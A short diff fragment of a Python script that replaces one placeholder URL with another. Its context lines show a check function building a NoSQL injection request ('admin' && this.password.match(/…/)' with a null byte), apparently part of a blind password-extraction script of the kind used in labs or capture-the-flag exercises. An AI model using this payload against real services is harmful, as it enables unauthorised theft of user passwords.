@@ -1,7 +1,7 @@
 import urllib.request
 import string
 
-URL = "http://dummy.libcurl.st"
+URL = "http://dummy.url"
 
 def check(payload):
     url = URL + "/?search=admin%27%20%26%26%20this.password.match(/" + payload + "/)%00"
